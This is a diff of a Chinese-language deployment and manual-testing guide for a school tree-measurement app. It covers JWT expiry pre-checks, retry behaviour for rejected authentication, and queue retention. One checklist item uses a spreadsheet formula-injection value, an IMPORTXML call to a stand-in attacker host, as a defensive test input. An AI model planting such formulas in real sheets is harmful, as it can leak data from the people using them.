@@ -74,8 +74,17 @@
 
 Google ID Token 約 1 小時後過期。若學生離線超過一小時才恢復網路,佇列中那筆的權杖已失效:
 
-- 後端回 `{status:'error', code:'AUTH_EXPIRED'}`。
+- 後端**在呼叫 tokeninfo 之前**先解開 ID Token 自己的 payload 讀 `exp`(`getTokenExpirySeconds`),過期就直接回 `{status:'error', code:'AUTH_EXPIRED'}`。JWT 的 payload 是明碼 base64url,不必驗簽就讀得到;這裡只當「快速且可靠的過期預檢」,真正的信任邊界仍是 tokeninfo(驗簽 + `aud`/`hd`)。
+- 這樣就**不必再去比對 Google 錯誤訊息裡有沒有 "expired" 這個英文字** —— 舊做法一旦 Google 改文案,過期會被誤判成 `AUTH_REJECTED`。
 - 前端**不會**丟掉這筆資料(資料本身仍有效),而是停止背景自動重送,並顯示提示要學生重新登入;重新登入後會自動補送。
+
+### 身分被拒(AUTH_REJECTED)—— 資料同樣不會被刪
+
+`aud`/`hd`/email 網域任一項不符就回 `AUTH_REJECTED`。**前端會把這筆資料留在佇列**、暫停自動重送,並顯示「帳號驗證失敗,請聯絡老師確認系統設定」。
+
+原因:學生自己重新登入救不了 `aud` 不符 —— 那是 Step 3 兩處 `GOOGLE_CLIENT_ID` 沒貼成同一個的設定問題,只有老師改部署設定才修得好。設定修好前把資料丟掉,等於因為一個筆誤永久刪光全班紀錄。
+
+唯一會被移出佇列的是 `VALIDATION_FAILED`(資料本身壞掉,前端已先驗過一次,正常紀錄不會走到這裡)。
 
 ## Step 5:手動驗證清單(TODO,部署後由人類逐項執行)
 
@@ -86,9 +95,13 @@ Google ID Token 約 1 小時後過期。若學生離線超過一小時才恢復�
 - [ ] **同一個 `clientRecordId` 再送一次**,確認回應為 `{"status":"ok","duplicate":true}`,且 Sheet **沒有**新增第二列(去重生效)
 - [ ] 不帶 `idToken`(或隨便亂填)送出 POST,確認回應為 `{"status":"error","code":"AUTH_REJECTED",...}`,且 Sheet 沒有新增資料
 - [ ] 用**非校網域**的 Google 帳號(個人 gmail)登入取得 token 後送出,確認同樣回 `AUTH_REJECTED`
-- [ ] 把 `angleDeg` 改成 `95` 送出,確認回應為 `{"status":"error","code":"VALIDATION_FAILED",...}`,且 Sheet 沒有新增資料
+- [ ] **(前端行為,在量測頁面上做)** 離線填 2 筆進佇列後恢復網路,讓補送被判 `AUTH_REJECTED`(最容易製造的情境:暫時把 `Code.gs` 的 `GOOGLE_CLIENT_ID` 改成別的字串再部署)。確認:兩筆**仍留在待同步佇列**(devtools → Application → IndexedDB → `tree-map-offline-queue`)、頁面顯示「帳號驗證失敗,請聯絡老師確認系統設定」、且不會每次 `online` 都重打後端。把 Client ID 改回正確值後重新登入,兩筆應自動補送成功。
+  - **為什麼 `AUTH_REJECTED` 不再丟掉資料**:`aud` 不符最常見的原因是 `public/tree.html` 與 `apps-script/Code.gs` 兩處的 `GOOGLE_CLIENT_ID` 沒貼成同一個(Step 3 是兩個各自獨立的人工貼上點)。這種設定筆誤會讓**每一筆**送出都被拒;若照舊把紀錄丟出佇列,一個五分鐘就能修好的筆誤會在第一次同步時永久刪光全班的量測資料。因此改成「保留資料、暫停自動重送、提示找老師」。
+- [ ] 把 `angleDeg` 改成 `95` 送出,確認回應為 `{"status":"error","code":"VALIDATION_FAILED",...}`,且 Sheet 沒有新增資料;**在量測頁面上**送同樣的錯誤資料,確認該筆**不會**留在佇列(資料本身壞掉,留著也送不出去 —— 只有 `VALIDATION_FAILED` 會被移出佇列)
 - [ ] `studentName` 填 `=IMPORTXML("http://evil.example","//a")` 送出,確認 Sheet 儲存格顯示的是那串**文字**而不是執行公式
-- [ ] 用超過一小時前取得的舊 token 送出,確認回應為 `{"status":"error","code":"AUTH_EXPIRED",...}`
+- [ ] 用超過一小時前取得的舊 token 送出,確認回應為 `{"status":"error","code":"AUTH_EXPIRED",...}`(**不是** `AUTH_REJECTED`)。此判定現在來自 token 自己的 `exp` claim(`getTokenExpirySeconds` 解 JWT 的 payload),**不再**依賴比對 Google 錯誤訊息裡有沒有 "expired" 這個英文字,因此 Google 改文案也不會誤判。
+  - 佐證方式:把舊 token 貼到 [jwt.io](https://jwt.io/) 或在 console 執行 `JSON.parse(atob(token.split('.')[1]))` 看 `exp`,確認 `exp * 1000 < Date.now()`;此時後端其實**完全沒有**呼叫 tokeninfo 就直接回 `AUTH_EXPIRED`(可在 Apps Script 的「執行項目」記錄確認執行時間極短、無外部呼叫)。
+  - 另測一個**格式壞掉**的 token(例如 `abc.def`,只有兩段):應回 `AUTH_REJECTED` 而非 `AUTH_EXPIRED`(讀不出 `exp` → 交給 tokeninfo 拒絕)。
 - [ ] 對 Web App URL 加上 `?treeId=A-023&idToken=<ID_TOKEN>` 送出 GET,確認回傳 `{"status":"ok","records":[...]}` 且內容與 Sheet 中該樹編號的所有紀錄一致
 
 ### 測試 POST 範例(瀏覽器 devtools console)
